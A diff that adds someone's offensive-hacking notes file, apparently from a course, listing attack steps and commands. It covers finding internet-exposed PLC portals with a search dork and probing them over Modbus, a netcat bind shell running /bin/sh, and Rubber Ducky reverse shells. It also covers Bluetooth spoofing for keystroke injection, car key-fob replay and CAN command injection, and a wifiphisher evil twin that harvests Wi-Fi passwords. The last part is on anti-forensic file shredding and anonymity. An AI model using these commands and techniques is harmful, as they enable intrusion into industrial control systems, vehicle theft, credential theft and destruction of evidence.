@@ -1,0 +1,214 @@
+Scada ICS hack
+ICS - Industrial Control System run by
+PLCS - Programmable Logic Controllers
+(prisons, factories other facilities)
+ 
+Rubber Duckey: 
+A flashdrive which has a reprogrammed firmware 
+telling the system that it is not a storage device, but a keyboard.
+With that you can send keystrokes to the system already stored on the device.
+Antivirus can detect it if it is as known exploit.
+
+Nethunter: Kali on phone
+Airodump-ng: packet capture tool
+suitable to capture WEP IVs or WPA handshakesto use them in aircrack-ng
+Inside the handshake there is the hash od the password
+
+
+BLUETOOTH hacking
+** sudo hciconfig - shows the available bluetooth interfaces 
+if you have a bluetooth adapter
+** sudo hcitool scan - scan for bluetooth devices in the area
+** sudo hcitool inq - gives the device class (0X002540 - keyboard)
+** sudo apt install spooftooph
+spooftoph can spoof the mac address of a bluetooth device
+** sudo spooftooph -i hci0 -a new mac address -n new name
+the device still needs to be paired with the pc and act as a keyboard
+If that is successful you can inject commands 
+into the host system through the bluetooth device
+
+Google search: inurl:/Portal/Portal.mwsl
+finds PLCS system portals (most plants are online)
+
+mimikatz can read the memory out of windows systems
+where also passwords can be available
+
+
+Spoof my text - spoofing sms messages
+texbelt.com
+the sender number cannot be chosen
+you cannot send URLs
+
+
+RaspberryPi hacking
+Download Kali ARM version for your Pi
+Create an image on an SD card adn insert it into the Raspberry
+netcat -> creates a tcp connection 
+** sudo nc -l -p59 -e /bin/sh -> listener on the Pi
+** sudo nc ip address 59 -> on the attacker
+we have a connection now
+
+** nmap -sT default gateway
+** msfconsole -> metasploit
+search modbus
+
+** gem install modbus-cli
+we can probe the memory in the PLCS
+
+
+Car Hacks
+Software Defined Radio
+(drones, car keys, wifi, mobile phones are all sending radio signals)
+we need to pickup and send signals back
+(RTL-SDR USB-kit - HDSDR.de - receiver only)
+1. you can jam the signal so the fob will not close the car
+2. you can capture and store the signal and replay it
+
+post 2020 cars have a rolling code already, harder to hack
+The antenna is important
+
+HackRF device can receive and send signals too 
+(not simultaneously - either receive or send)
+dragon OS - specificly designed for SRD
+useful apps: 
+- airspy
+- universal radio hacker
+- gqrx
+
+osmocom_siggen_nogui - can generate blocking signals even wifi
+OBD II connector under the dashboard to read out info from the car
+can-utils -> working with car networks
+github.com/zombieacraig/ICSim - car simulator
+cansniffer - sniffing the can network: what command does what in the car system
+candump - grab the sniffed traffic and dump in a file
+can send command#data - sends the command to the car
+there is no standard command set in the industry 
+
+
+Mobile hacking
+femtocell hardware (network extender)
+used for men in the middle attacks
+USBtoHDMI cable is needed
+inside the femtocell a small linux kernel is running (monta linux)
+it doesn't have a bash shell
+get root access
+flash it with a new linux kernel/firmware (openwrt)
+works within 15 - 50 ft
+voice and sms are encrypted
+
+
+
+WiFi Hacking with Raspberry PI 4
+Get Kali ARM
+Get Raspberry Pi OS (raspberry Pi Imager)
+Write the Kali system to the SD card
+micro HDMI converter
+default Kali login: kali / pwd kali
+
+fern - monitor wifi traffic
+for attacking you need a wordlist (included in kali)
+
+wifite - cli wifi attacking app
+
+
+Hacking android phones or iPads
+need OMG cable with built in
+- access point
+- keylogger
+- load script
+
+Check reverse shell
+A rubber duckey runs a script which creates a reverse shell 
+on the target pc when the thumb drive is connected.
+
+
+Hiding secret files in music and photo files
+Steganography: putting data into a channel of another file
+
+deepsound - jpinsoft.net
+Least significant bit cryptography 
+(changes the least significant bits in the visible file. 
+When converting back the secret file 
+those minor changes will be compiled back to the secret file)
+The original file becomes significantly larger
+
+Do not use Word for storing secret text, because your GUID is embedded.
+(Global Unique Identification Number - info about your PC)
+Use Vim, Open Office, Notepad, anythung but office apps
+
+deepsound uses AES256 encryption
+
+stegosuite (kali) can use image
+stegosuite -k key - m "message" "/path to the file to embed in"
+stegosuite extract -k key /path to the embedded file
+
+we can embed a complete file too
+
+How to get rid of the information completely after getting it
+deletion is not an option - always recoverable
+shred (linux) - overwrites the file repeatedly
+shred -f -n 10 "filename with path" (force and number of iteration)
+
+bleachbit (has GUI)
+overwrites the files similarly to shred
+can cleanup the system too
+
+
+How to be anonymous
+- Don't use Chrome, Edge even Mozzilla isn't safe
+- Brave is better
+- Disable cookies
+- use private browser windows
+- use proxychains (kali)
+	sudo mousepad /etc/proxychains4.conf
+	by default uses TOR
+	sudo systemctl start tor
+	sudo proxychains firefox
+- sudo git clone https://github.com/Und3rf10w/kali-anonsurf
+	sudo ./installer
+	sudo anonsurf start
+- create false profiles
+- use starlink (no geolocation to the IP address)
+- use protonmail
+- learn antiforensics and osint 
+- don't use google for search
+- use duckduckgo in brave instead
+
+
+WiFi phishing
+WPA2 hacking is a guessing game, 
+needs a wordlist in the language of the target wifi
+social engineering is important - create a password list from that
+
+wifiphisher - creates an evil twin (man in the middle)
+needs a wifi adapter with monitor mode
+sudo wifiphisher -i wlan0 -e access point name we want to attack
+projects a firmware update screen on the target 
+and captures the password entered
+
+burpsuite - create munged password list
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
